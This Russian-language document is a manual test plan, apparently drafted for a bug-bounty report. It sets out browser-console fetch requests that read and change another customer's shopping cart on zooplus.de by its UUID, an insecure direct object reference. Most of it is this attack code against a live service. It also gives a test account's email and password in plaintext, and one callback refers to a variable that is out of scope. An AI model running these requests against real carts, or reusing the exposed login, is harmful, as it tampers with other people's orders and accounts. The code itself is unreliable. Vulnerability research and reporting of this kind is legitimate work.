# Ручное тестирование модификации корзины

## Критически важно: выполнить в браузере под Account B

### Шаг 1: Подготовка
1. Залогиниться под Account B: `suobup@dunkos.xyz` / `suobup@dunkos.xyzQ1`
2. Открыть DevTools (F12) → вкладка **Console**
3. Очистить Network tab

### Шаг 2: Получить состояние корзины Account A
```javascript
const CART_UUID = "6bd223b4-5040-4faa-ba85-6a85c1ec2d50";

fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
  credentials: 'include'
})
.then(r => r.json())
.then(cart => {
  console.log('Cart before:', cart.articles.length, 'items');
  console.log('Total:', cart.summary.grandTotal, 'EUR');
  window.beforeCount = cart.articles.length;
});
```

### Шаг 3: Тест 1 - Добавить товар (основной тест)
```javascript
fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}/articles`, {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/json",
    "x-requested-with": "XMLHttpRequest"
  },
  body: JSON.stringify({
    "offerId": 2966095
  })
})
.then(r => {
  console.log('Status:', r.status);
  return r.text();
})
.then(text => {
  console.log('Response:', text.substring(0, 500));
  if (r.status === 200 || r.status === 201) {
    console.log('[!!!] SUCCESS!');
  }
  
  // Verify
  return fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}`, {
    credentials: 'include'
  });
})
.then(r => r.json())
.then(cart => {
  console.log('Cart after:', cart.articles.length, 'items');
  if (cart.articles.length > window.beforeCount) {
    console.log('[!!!] VERIFIED: Cart modified!');
    console.log(`Before: ${window.beforeCount}, After: ${cart.articles.length}`);
  }
});
```

### Шаг 4: Тест 2 - Добавить через /add (если тест 1 не сработал)
```javascript
fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}/add`, {
  method: "POST",
  credentials: "include",
  headers: {
    "Content-Type": "application/x-www-form-urlencoded"
  },
  body: "offerId=2966095&quantity=1"
})
.then(r => {
  console.log('Status:', r.status);
  return r.text();
})
.then(text => {
  console.log('Response:', text);
});
```

### Шаг 5: Тест 3 - Удалить товар
```javascript
fetch(`https://www.zooplus.de/checkout/api/cart-api/v2/cart/${CART_UUID}/articles/2966422/remove`, {
  method: "POST",
  credentials: "include"
})
.then(r => {
  console.log('Status:', r.status);
  return r.text();
})
.then(text => {
  console.log('Response:', text);
});
```

### Шаг 6: Сделать скриншоты
1. Network tab с успешным запросом
2. Response с данными
3. Console с результатами
4. Повторное чтение корзины с измененным количеством товаров

## Если хотя бы один тест успешен:
- Обновить отчет с Critical severity
- Добавить скриншоты
- Документировать точный endpoint и payload

